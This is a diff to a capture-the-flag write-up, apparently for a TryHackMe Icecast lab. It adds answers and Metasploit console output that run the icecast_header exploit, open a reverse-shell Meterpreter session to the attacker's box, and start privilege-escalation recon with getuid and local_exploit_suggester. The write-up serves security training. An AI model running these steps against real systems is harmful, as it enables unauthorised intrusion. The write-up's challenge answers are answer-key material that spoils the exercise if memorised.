@@ -196,6 +196,14 @@ You should see a green tick next to Connected. It will also show you your intern
 > 3.7. <em>First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`</em><br><a id='3.7'></a>
 >> <code><strong>No answer needed</strong></code>
 
+<br>
+
+<pre><code>msf6 exploit(windows/http/icecast_header) > set RHOSTS [Target]
+RHOSTS => [Target]
+msf6 exploit(windows/http/icecast_header) > 
+</code></pre>
+
+<br>
 
 <br>
 <br>
@@ -204,6 +212,79 @@ You should see a green tick next to Connected. It will also show you your intern
 <p align="center"> <img width="200px" src="https://github.com/user-attachments/assets/458c28bf-9d68-44d0-b420-6136ff40ea6f"> </p>
 
 <p>Enumerate the machine and find potential privilege escalation paths to gain Admin powers!</p>
+
+<p align="center">Enumerate the machine and find potential privilege escalation paths to gain Admin powers!</p>
+
+<br>
+
+<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
+
+> 4.1. <em>Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?</em><br><a id='4.1'></a>
+>> <code><strong>meterpreter</strong></code>
+
+<br>
+
+<pre><code>msf6 exploit(windows/http/icecast_header) > exploit
+
+[*] Started reverse TCP handler on [THM AttackBox IP]:[THM AttackBox Port] 
+[*] Sending stage (177734 bytes) to [Target]
+[*] Meterpreter session 1 opened ([THM AttackBox IP]:[THM AttackBox Port] -> [Target IP]:[Target Port]) at 2024-12-08 18:48:31 +0000
+
+meterpreter ></code></pre>
+
+<br>
+
+> 4.2. <em>What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'Metasploit' module.</em><br><a id='4.2'></a>
+>> <code><strong>dark</strong></code>
+
+<br>
+
+<pre><code>meterpreter > getuid
+Server username: Dark-PC\Dark
+meterpreter ></code></pre>
+
+<br>
+
+<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/25d99952-bdcd-4a8e-90d1-563ddeb13a27"> </p>
+
+
+<br>
+
+> 4.3. <em>What build of Windows is the system?</em><br><a id='4.3'></a>
+>> <code><strong>7601</strong></code>
+
+<br>
+
+<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/04dceb8d-37d6-49d1-a79a-dc8dc7f23d4a"> </p>
+
+
+<br>
+
+> 4.4. <em>Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?</em><br><a id='4.4'></a>
+>> <code><strong>x64</strong></code>
+
+<br>
+
+<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/e654c39c-7e38-4de6-824d-d4aea50890d0"> </p>
+
+<br>
+
+> 4.5. <em>Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*</em><br><a id='4.5'></a>
+>> <code><strong>x64</strong></code>
+
+<br>
+
+<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/5cf9fffe-98b8-49a5-b387-be90ef749018"> </p>
+
+
+<br>
+
+
+
+
+
+
+
 
 
 
